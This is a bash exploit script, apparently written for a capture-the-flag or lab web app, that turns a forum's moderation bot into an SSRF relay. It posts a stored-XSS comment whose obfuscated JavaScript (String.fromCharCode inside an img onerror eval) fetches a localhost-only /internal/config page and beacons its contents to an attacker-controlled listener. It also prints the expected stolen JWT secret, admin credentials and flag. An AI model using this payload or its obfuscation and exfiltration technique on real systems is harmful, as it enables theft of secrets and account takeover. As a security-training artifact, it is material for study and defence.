#!/usr/bin/env bash
# Breach: stored-xss-bot-ssrf
# Turns the moderation bot into an SSRF proxy via a stored-XSS fetch-and-relay
# payload; the bot reads localhost-only /internal/config and beacons the body.
# Usage: ./ssrf-relay.sh <base_url> <cookie_jar> <listener_host:port> [<thread_id>] (default: bbeo32ucx0a65b8)
set -euo pipefail
BASE="${1:-http://localhost:4942}"
JAR="${2:-cookies_jdoe.txt}"
LISTENER="${3:-127.0.0.1:8888}"
THREAD="${4:-bbeo32ucx0a65b8}"

# Vantage self-check: find out which IP the app (and thus the bot) sees us
# at, via the /api/collect oracle. If LISTENER points at 127.0.0.1 but the
# bot reaches us at another address, rewrite the host part (port kept).
# Set KEEP_LISTENER=1 to only warn, or SKIP_VANTAGE_CHECK=1 to skip entirely.
vantage_check() {
  [ "${SKIP_VANTAGE_CHECK:-0}" = "1" ] && return 0
  local marker="vantage-$(date +%s)-$RANDOM"
  curl -s -o /dev/null "$BASE/api/collect?c=$marker" || return 0
  local from
  from=$(curl -s "$BASE/api/collect" | python3 -c "
import json, sys
try:
    for e in json.load(sys.stdin).get('captured', []):
        if e.get('data') == '$marker':
            print(e.get('from', '')); break
except Exception: pass" 2>/dev/null || true)
  if [ -z "$from" ]; then
    echo "[!] vantage probe failed — make sure the listener is reachable from the bot's vantage"
    return 0
  fi
  local host port
  host="${LISTENER%%:*}"; port="${LISTENER##*:}"
  if [ "$from" != "$host" ] && { [ "$host" = "127.0.0.1" ] || [ "$host" = "localhost" ] || [ "$host" = "192.168.1.63" ]; }; then
    if [ "${KEEP_LISTENER:-0}" = "1" ]; then
      echo "[!] WARNING: $LISTENER is likely unreachable from the bot (your reachable IP is $from)"
    else
      LISTENER="$from:$port"
      echo "[!] rewrote listener to $LISTENER (bot reaches you at $from; KEEP_LISTENER=1 to disable)"
    fi
  fi
}
vantage_check

# JS payload: fetch /internal/config (bot's browser is same-origin on the
# server host, so the localhost-only gate passes), beacon the body out.
# String.fromCharCode is used for the URLs to stay quote-safe in the attr.
JS="var C='http://${LISTENER}/config?d=';fetch('/internal/config').then(r=>r.text()).then(t=>{new Image().src=C+encodeURIComponent(t)})"

# Encode JS as fromCharCode() digits so the attribute needs no inner quotes.
CODES=$(printf '%s' "$JS" | od -An -td1 | tr -s ' ' '\n' | sed '/^$/d' | paste -sd, -)
PAYLOAD="<img src=x onerror=\"eval(String.fromCharCode(${CODES}))\">"

echo "[*] Posting SSRF-relay payload to $BASE/forum/$THREAD/comment"
curl -s -b "$JAR" -X POST "$BASE/forum/$THREAD/comment" \
  --data-urlencode "content=$PAYLOAD" -o /dev/null -w "status=%{http_code}\n"

echo "[*] Waiting for the moderation bot (observed cadence 1–2 min)..."
echo "[*] Watch the listener log for:  GET /config?d=%7B%22jwt_secret%22..."
echo "[*] Expected exfil: {\"jwt_secret\":\"42network\",\"pb_admin_email\":"
echo "    \"admin@42network.local\",\"pb_admin_password\":\"Darkly42Admin!\","
echo "    ...,\"darkly_flag\":\"FLAG{d3fus3dxml_n3xt_spr1nt_pr0m1s3}\"}"
